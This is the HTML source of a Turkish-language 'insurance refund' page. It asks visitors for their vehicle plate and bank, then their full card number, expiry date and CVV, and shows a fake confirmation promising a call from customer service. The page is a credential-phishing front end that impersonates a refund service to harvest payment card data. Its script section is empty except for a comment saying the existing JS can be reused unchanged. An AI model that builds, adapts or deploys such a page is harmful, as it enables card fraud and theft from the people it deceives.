<!doctype html>
<html lang="tr">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>SİGORTA İADE PANELİ - Onay Ekranı</title>
<style>
:root{
  --bg:#eef2f7;
  --panel:#ffffff;
  --primary:#4f46e5;
  --muted:#6b7280;
  --error:#ef4444;
  --success:#16a34a;
}
*{box-sizing:border-box;}
body {
  font-family:'Segoe UI',sans-serif;
  background: var(--bg);
  margin:0;
  padding:15px;
  display:flex;
  justify-content:center;
  align-items:flex-start;
  min-height:100vh;
}
.panel {
  background: var(--panel);
  margin-top:20px;
  padding:20px;
  border-radius:15px;
  box-shadow:0 10px 25px rgba(0,0,0,0.08);
  width:100%;
  max-width:400px;
  position:relative;
}
h1 { font-size:18px; text-align:center; color:#1f2937; margin-bottom:12px; }
h2 { font-size:15px; margin-top:16px; color:#374151; border-bottom:1px solid #e5e7eb; padding-bottom:6px; }
label { font-weight:600; display:block; margin-bottom:6px; font-size:13px; color:#1f2937; }
input[type="text"], select {
  width:100%;
  padding:10px;
  border-radius:8px;
  border:1px solid #d1d5db;
  margin-bottom:12px;
  font-size:14px;
  background:white;
  transition:0.2s;
}
input[type="text"]:focus, select:focus { border-color: var(--primary); outline:none; box-shadow:0 0 0 2px rgba(79,70,229,0.2); }
.row { display:flex; gap:6px; flex-wrap:wrap; }
.row .half { flex:1; min-width:48%; }
button {
  width:100%;
  padding:12px;
  border:none;
  border-radius:10px;
  background: var(--primary);
  color:white;
  font-weight:600;
  cursor:pointer;
  margin-top:6px;
  transition:0.2s;
  font-size:14px;
}
button:hover { background:#4338ca; }
button.secondary { background:#6b7280; }
button.secondary:hover { background:#4b5563; }
button:disabled { opacity:0.6; cursor:not-allowed; }
.msg { font-size:12px; text-align:center; margin-top:8px; color:var(--muted); word-break:break-word; }
.error { color: var(--error); }
.card-section { display:none; margin-top:16px; animation:fadeIn 0.25s ease; }
@keyframes fadeIn { from {opacity:0; transform:translateY(6px);} to {opacity:1; transform:translateY(0);} }
.confirm {
  display:none;
  position:absolute;
  inset:0;
  background: rgba(255,255,255,0.97);
  border-radius:15px;
  padding:20px;
  text-align:center;
  z-index:30;
  box-shadow:0 12px 30px rgba(0,0,0,0.15);
}
.confirm img { width:72px; height:72px; object-fit:contain; margin-bottom:12px; border-radius:12px; }
.confirm h3 { margin:6px 0 8px 0; color:#1f2937; font-size:16px; }
.confirm p { color: var(--muted); font-size:13px; margin:0 0 12px 0; }
@media(max-width:360px){
  body { padding:10px; }
  .panel { padding:15px; }
  input[type="text"], select, button { font-size:13px; padding:8px; }
  h1 { font-size:16px; }
  h2 { font-size:14px; }
}
</style>
</head>
<body>
<div class="panel" role="region" aria-label="Bilgi giriş paneli">
  <h1>SİGORTA İADESİ İÇİN BİLGİLERİ DOLDURUN</h1>

  <h2>Seçtiğiniz kartınıza iadesi yapılacaktır</h2>
  <label for="plaka">Araç Plakası</label>
  <input type="text" id="plaka" placeholder="Örnek: 34 AB 1234" maxlength="12" autocomplete="off">

  <h2>Tüm Bankalar</h2>
  <label for="banka">Ödeme Yaptığınız Bankayı Seçiniz</label>
  <select id="banka" aria-label="Banka seçimi">
    <option value="">-- Banka Seçin --</option>
    <option>Ziraat Bankası</option>
    <option>VakıfBank</option>
    <option>Halkbank</option>
    <option>İş Bankası</option>
    <option>Garanti BBVA</option>
    <option>Akbank</option>
    <option>Yapı Kredi</option>
    <option>QNB Finansbank</option>
    <option>DenizBank</option>
    <option>TEB</option>
    <option>Şekerbank</option>
    <option>ING Bank</option>
    <option>Kuveyt Türk</option>
    <option>Albaraka Türk</option>
    <option>Ziraat Katılım</option>
    <option>Vakıf Katılım</option>
    <option>Türkiye Finans</option>
  </select>

  <button id="gonder">Devam</button>
  <div id="mesaj" class="msg" aria-live="polite"></div>

  <div id="kartSection" class="card-section" aria-hidden="true">
    <h2>İade yapılacak kart bilgisini giriniz</h2>
    <label for="cardNumber">Kart Numarası (16 haneli)</label>
    <input id="cardNumber" type="text" maxlength="19" placeholder="1234 5678 9012 3456" autocomplete="off">
    <div class="row">
      <div class="half">
        <label for="expiry">Son Kullanım (MM/YY)</label>
        <input id="expiry" type="text" maxlength="5" placeholder="MM/YY" autocomplete="off">
      </div>
      <div class="half">
        <label for="cvv">CVV</label>
        <input id="cvv" type="text" maxlength="3" placeholder="123" autocomplete="off">
      </div>
    </div>
    <button id="kartGonder">İade İşlemini Başlat</button>
    <button id="kartGeri" class="secondary" style="margin-top:8px;">Geri</button>
    <div id="kartMesaj" class="msg" aria-live="polite"></div>
  </div>

  <div id="confirm" class="confirm" role="dialog" aria-modal="true" aria-hidden="true">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHeY7yO0fy4lB4dXPLPV2Lo9qyr9nW91iSJA&s" alt="Onay ikonu">
    <h3>İşleminiz Tamamlandı</h3>
    <p>İşleminiz tamamlanmıştır, müşteri hizmetlerinden arama gelecektir.</p>
    <button id="yeni" style="max-width:260px; margin: 8px auto 0; display:block;">ANA EKRANA DÖN</button>
  </div>
</div>
<script>
// JS kodun aynı şekilde kullanılabilir, değişiklik gerek yok
</script>
</body>
</html>
